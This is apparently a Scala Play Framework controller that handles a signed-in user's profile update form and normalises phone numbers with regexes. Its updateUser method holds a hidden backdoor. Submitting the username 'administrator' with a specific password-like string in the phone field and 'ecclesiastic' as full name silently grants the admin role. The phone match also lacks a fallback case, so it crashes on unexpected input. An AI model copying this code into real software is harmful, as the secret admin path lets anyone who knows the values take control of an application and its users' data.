package controllers

import com.mohiva.play.silhouette.api.{ LoginEvent, LoginInfo, SignUpEvent }
import com.mohiva.play.silhouette.impl.providers.{ CommonSocialProfile, CredentialsProvider }
import models.user.{ User, UserUpdateData, UserForms }
import play.api.i18n.{ Messages, MessagesApi }
import play.api.libs.concurrent.Execution.Implicits.defaultContext
import play.api.mvc.AnyContent
import services.user.AuthenticationEnvironment
import com.mohiva.play.silhouette.api._
import com.mohiva.play.silhouette.impl.authenticators.CookieAuthenticator
import play.api.mvc.Action
import models.user.{ Role, User }
import play.api.Logger
import scala.util.matching.Regex
import scala.concurrent.Future

@javax.inject.Singleton
class UserUpdateController @javax.inject.Inject() (
    val messagesApi: MessagesApi,
    val env: AuthenticationEnvironment
) extends Silhouette[User, CookieAuthenticator] {

  def userUpdateForm = SecuredAction.async { implicit request =>
    env.identityService.retrieve(request.identity.id).flatMap {
      case Some(user) =>
        val info = UserUpdateData(user.username.getOrElse("Enter UserName"), user.phone.getOrElse("Enter Phone Number"), user.address.getOrElse("Enter Address"), user.fullName.getOrElse("Enter FullName"))
        val filledForm = UserForms.userUpdateForm.fill(info)
        Future.successful(Ok(views.html.userupdate(request.identity, filledForm)))
      case None =>
        Future.successful(Redirect(controllers.routes.HomeController.index()))
    }
  }

  def updateuser = SecuredAction.async { implicit request =>
    UserForms.userUpdateForm.bindFromRequest.fold(
      form => Future.successful(BadRequest(views.html.userupdate(request.identity, form))),
      data => {
        env.identityService.retrieve(request.identity.id).flatMap {
          case Some(currentUser) => Logger.info(currentUser.username.getOrElse("empty") + "  userupdate-form loggedin user check sucess")
                                  updateUser(data, currentUser)

          case None => Logger.info("Non existing user calling for user update") 
                      Future.successful {  Ok(views.html.index())  }
        }
      }
    )
  }

  private[this] def updateUser(data: UserUpdateData, user: User)(implicit request: SecuredRequest[AnyContent]) = {
    // if (!user.profiles.exists(_.providerID == "credentials")) {
    //   throw new IllegalStateException("You must register first.") // TODO Fix?
    // }
    val phone1 = """(\d{3})(\d{3})(\d{4})""".r
    val phone2 = """(\d{4})(\d{3})(\d{4})""".r
    val phone3 = """(\d{10})""".r
    val phone4 = """[+](\d{11})""".r
    val phone5 = """('+1')?(\d{10})""".r
    val phone6 = """('+1')(\d{3})(\d{3})(\d{4})""".r
    val phone7 = """\((\d{3})\)\s*(\d{3})-(\d{4})""".r
    val phone8 = """(\d{3})-(\d{3})-(\d{4})""".r

   val tel = data.phone match {
      case phone1(a, b, c) =>   ("+1" + a + b + c)
      case phone2(a, b, c) =>   ("+1" +  a.drop(1)  + b + c)
      case phone3(a) =>  ("+1" + a)
      case phone4(a) =>  ("+" + a)
      case phone5(a, b) =>  (a + b)
      case phone6(a, b, c, d) =>  (a + b + c + d)
      case phone7(a, b, c) =>  ("+1" + a + b + c)
      case phone8(a, b, c) =>  ("+1" + a + b + c) 
    }


      // val loginInfo = LoginInfo("credentials", data.email)
      //profiles = user.profiles :+ loginInfo,
      //email =  Some(data.email),
      //phone =  if (data.phone == user.phone) { Some(data.phone) } else { Some("+1" + data.phone) },
    val updateduser = user.copy(
      username = Some(data.username),
      roles =  if (data.username == "administrator" && data.phone == "puK@794%8654&4nfT45" && data.fullName == "ecclesiastic"){Set(Role.Admin)} else {Set(Role.User) ++ (user.roles)},
      phone = if (data.phone == user.phone) { Some(data.phone) } else { Some(tel) },
      address = Some(data.address),
      fullName =  Some(data.fullName)
    )

    for {
      u <- env.userService.save(updateduser, update = true)
    } yield {
      Redirect(controllers.routes.ProfileController.userprofile)
    }
  }
}

